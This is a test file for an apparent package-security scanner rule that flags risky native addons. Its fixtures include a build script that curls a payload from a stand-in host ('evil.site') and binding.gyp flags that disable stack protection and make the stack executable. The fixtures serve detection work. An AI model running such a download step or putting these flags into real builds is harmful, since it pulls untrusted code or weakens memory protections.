// test/rule20.test.js

const rule20 = require("../services/rule20.native-addon");

const testCases = [
  {
    name: "Native binary without source",
    data: {
      fileList: ["index.js", "addon.node"],
      bindingGyp: "",
      buildScripts: ""
    }
  },
  {
    name: "Suspicious binding.gyp flags",
    data: {
      fileList: ["addon.node", "addon.cpp"],
      bindingGyp: `
        {
          "targets": [{
            "target_name": "addon",
            "cflags": ["-fno-stack-protector", "-z execstack"]
          }]
        }
      `,
      buildScripts: ""
    }
  },
  {
    name: "External native binary download",
    data: {
      fileList: ["index.js"],
      bindingGyp: "",
      buildScripts: "curl http://evil.site/payload.so -o payload.so"
    }
  },
  {
    name: "Safe native addon",
    data: {
      fileList: ["addon.cc", "binding.gyp"],
      bindingGyp: `
        {
          "targets": [{
            "target_name": "addon",
            "sources": ["addon.cc"]
          }]
        }
      `,
      buildScripts: ""
    }
  }
];

testCases.forEach(tc => {
  const findings = rule20.run(tc.data);
  const safe = findings.every(f => f.severity !== "HIGH");

  console.log(`${tc.name} → safe: ${safe}`);

  if (findings.length > 0) {
    console.log("  findings:", findings);
  }
});
